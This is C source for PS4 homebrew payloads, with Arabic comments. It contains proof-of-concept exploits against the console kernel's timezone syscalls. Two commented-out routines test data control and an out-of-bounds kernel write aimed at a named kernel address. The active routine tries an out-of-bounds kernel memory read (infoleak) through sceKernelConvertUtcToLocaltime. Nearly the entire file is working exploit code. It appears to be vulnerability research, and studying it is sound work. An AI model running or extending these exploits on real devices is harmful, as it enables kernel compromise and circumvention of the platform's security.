/*
#include "ps4.h"

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork();
    jailbreak();
    initSysUtil();

    printf_debug("=== timezone data control PoC ===\n");

    // [1] اكتب timezone table
    static uint8_t data[2 * 16];
    memset(data, 0, sizeof(data));

    *(long*)(data + 0)  = 0x0;
    *(int*)(data  + 8)  = 0x1111;
    *(int*)(data  + 12) = 0x2222;

    *(long*)(data + 16) = 0x7FFFFFFF;
    *(int*)(data  + 24) = 0x3333;
    *(int*)(data  + 28) = 0x4444;

    int r = sceKernelSetTimezoneInfo(data, 2);
    printf_debug("set_timezone r=%d\n", r);

    // [2] settimeofday
    struct {
        int tz_minuteswest;
        int tz_dsttime;
    } tz = {
        .tz_minuteswest = 0x5555,
        .tz_dsttime     = 0x6666,
    };

    struct {
        void* tv_ptr;
        void* tz_ptr;
    } sod_args = {
        .tv_ptr = NULL,
        .tz_ptr = &tz,
    };

    r = syscall(116, &sod_args);
    printf_debug("settimeofday r=%d\n", r);

    // [3] اقرأ النتيجة
    long out_local = 0;
    long out_tz[2] = {0, 0};
    int  out_dst   = 0;

    r = sceKernelConvertUtcToLocaltime(
        0x1000,
        &out_local,
        out_tz,
        &out_dst
    );

    printf_debug("convert r=%d\n",    r);
    printf_debug("out_local=0x%lx\n", out_local);
    printf_debug("out_tz[0]=0x%lx\n", out_tz[0]);
    printf_debug("out_tz[1]=0x%lx\n", out_tz[1]);
    printf_debug("out_dst  =0x%x\n",  out_dst);

    // binary search اختار entry[1] لأن timestamp=0x1000 > entry[0].timestamp=0
    // إذن offset = entry[1].offset = 0x3333
    // out_local = entry[1].offset + timestamp = 0x3333 + 0x1000
    long expected = 0x3333L + 0x1000L;
    printf_debug("expected =0x%lx\n", expected);

    if (out_local == expected) {
        printf_debug("[+] DATA CONTROL CONFIRMED!\n");
    } else {
        printf_debug("[-] no match\n");
    }

    return 0;
}



#include "ps4.h"

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork();
    jailbreak();
    initSysUtil();

    printf_debug("=== timezone OOB write PoC ===\n");

    // 512 entry × 16 bytes = 0x2000 bytes
    static uint8_t data[512 * 16];
    memset(data, 0x41, sizeof(data));

    // آخر entry تصل لـ DAT_ffffffff844d1790 (count)
    // لو كتبنا 0x41414141 على count → نغيره!

    int r = sceKernelSetTimezoneInfo(data, 512);
    printf_debug("set_timezone r=%d\n", r);

    if (r == 0) {
        printf_debug("[+] wrote 0x2000 bytes to kernel!\n");
        printf_debug("DAT_ffffffff844d1790 should be 0x41414141\n");
        printf_debug("DAT_ffffffff844d1798 should be 0x4141414141414141\n");
    }

    return 0;
}
*/


#include "ps4.h"

int _main(struct thread *td) {
    UNUSED(td);

    initKernel();
    initLibc();
    initNetwork();
    jailbreak();
    initSysUtil();

    printf_debug("=== timezone infoleak v3 ===\n");

    static uint8_t data[512 * 16];
    memset(data, 0, sizeof(data));

    for (int i = 0; i < 512; i++) {
        *(long*)(data + i * 16)      = (long)i * 0x1000;
        *(int*)(data  + i * 16 + 8)  = 0x41410000 + i;
        *(int*)(data  + i * 16 + 12) = 0;  // كل dst = 0
    }

    int r = sceKernelSetTimezoneInfo(data, 512);
    printf_debug("set_timezone r=%d\n", r);

    long out_local = 0;
    long out_tz[2] = {0, 0};
    int  out_dst   = 0;

    // timestamp بين entry[510] و entry[511]
    // uVar6 = 510
    // loop يصل لـ iVar7 = 2
    // يقرأ من index = 512 = خارج buffer!
    long timestamp = 510 * 0x1000 + 1;

    r = sceKernelConvertUtcToLocaltime(
        timestamp,
        &out_local,
        out_tz,
        &out_dst
    );

    printf_debug("convert r=%d\n",    r);
    printf_debug("out_local=0x%lx\n", out_local);
    printf_debug("out_tz[0]=0x%lx\n", out_tz[0]);
    printf_debug("out_tz[1]=0x%lx\n", out_tz[1]);
    printf_debug("out_dst  =0x%x\n",  out_dst);

    // لو out_dst != 0 = قرأنا من خارج buffer
    // DAT_ffffffff844d1790 + 4 = 0x844d1794
    // DAT_ffffffff844d1798 + 4 = 0x844d179c
    if (out_dst != 0) {
        printf_debug("[+] OOB READ!\n");
        printf_debug("leaked = 0x%x\n", out_dst);
    } else {
        printf_debug("[-] dst = 0, loop completed without OOB\n");
    }

    return 0;
}